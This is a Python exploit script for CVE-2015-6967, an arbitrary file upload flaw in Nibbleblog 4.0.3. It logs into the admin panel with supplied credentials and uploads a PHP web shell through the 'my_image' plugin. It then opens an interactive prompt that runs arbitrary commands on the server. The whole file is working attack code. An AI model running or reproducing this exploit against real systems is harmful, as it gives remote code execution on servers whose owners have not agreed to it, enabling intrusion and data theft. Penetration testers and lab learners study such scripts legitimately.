import requests, sys, random, string


if len(sys.argv) != 4:
    print("* CVE-2015-6967 | Nibbleblog 4.0.3 - Arbitrary File Upload *\n")
    print("Usage: python3 exploit.py <rhost> <username> <password>")
    print("Example: python3 exploit.py http://www.evil.com root toor")
    sys.exit()


rhost = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]


login_url = f'{rhost}/nibbleblog/admin.php'
image_url = f"{rhost}/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image"
payload = '<?php echo shell_exec($_GET["rce"]); ?>'
shell_path = f"{rhost}/nibbleblog/content/private/plugins/my_image/image.php"

SESSION = requests.Session()


def login():
    data = {"username": username, "password": password}
    try:
        req = SESSION.post(url=login_url, data=data, timeout=10, verify=False)
        if 'Dashboard' in req.text:
            print("[ + ] Login succeed.")
        else:
            sys.exit("[ ! ] Login failed, exiting.")
    except Exception as e:
        sys.exit(f"[ - ] Exception occured: {e}")


def execute():
    login()

    try:
        req = SESSION.get(url=image_url, timeout=10, verify=False)
    except Exception as e:
        sys.exit(f"[ - ] Exception occured: {e}")

    if 'Plugins :: My image' in req.text:
        print("[...] Uploading shell...")
        print(75 * '-')

        data = {
            "plugin": (None, 'my_image'), "title": (None, 'My image'), "position": (None, 4), "caption": "",
            "image": ('doesnt_matter.php', payload, "application/x-php", {'Content-Disposition': 'form-data'}),
            "image_resize": (None, 1), "image_width": (None, 200), "image_height": (None, 200), "image_option": (None, 'auto')
        }
        try:
            upload = SESSION.post(url=image_url, files=data, timeout=10, verify=False)

            if 'Changes has been saved successfully' in upload.text:
                print(f"[ * ] Shell has been uploaded successfully!")
                print(75 * '-')
                while True:
                    params = {"rce": input("Shell> ")}
                    command = SESSION.get(url=shell_path, params=params, verify=False)
                    print(command.text)
            else:
                sys.exit("[ - ] Shell upload failed, exiting")
        except Exception as e:
            sys.exit(f"[ - ] Exception occured: {e}")

    else:
        sys.exit("Couldn't get into image upload path, exiting")


execute()
